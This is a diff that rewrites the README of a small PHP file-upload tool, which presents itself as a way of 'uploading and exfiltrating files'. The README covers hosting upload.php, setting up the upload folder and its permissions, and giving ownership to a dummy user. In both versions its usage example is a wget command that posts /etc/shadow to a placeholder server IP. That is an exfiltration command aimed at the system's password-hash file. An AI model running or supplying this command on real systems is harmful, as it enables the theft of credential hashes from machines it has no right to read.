@@ -1,31 +1,33 @@
-# PHPuploader
- Upload/exfiltrate files.
+# PHP File Uploader
+A secure and efficient solution for uploading and exfiltrating files using PHP.
 
-# Usage
-Host "upload.php" on the server.
+## Installation
+1. Host the "upload.php" file on your server.
+
 ```
 php -S 127.0.0.1:8080 -t .
 ```
-Create "upload" directory and configure.
+2. Create the "upload" directory and configure its settings.
+
 ```
 mkdir upload
 ```
-Set (only write) permissions to folder.
+3. Set the appropriate permissions for the "upload" folder (write-only).
+
 ```
 cd upload && umask 555
 ```
-Additionally, you can change ownership of the folder.
+4. Optionally, change the ownership of the "upload" folder to enhance security.
+
 ```
 useradd dummy && chown dummy upload
 ```
-Example method for posting file to server.
+
+## Usage
+To upload a file to the server, use the following method as an example:
+
 ```
-wget --post-file=/etc/shadow <server_ip>/upload.php?name=shadow
+wget --post-file=/etc/shadow <server_ip>/upload.php?file=shadow
 ```
 
-
-
-
-
-
- 
+Replace <server_ip> with the IP address of your server and adjust the file path as needed.
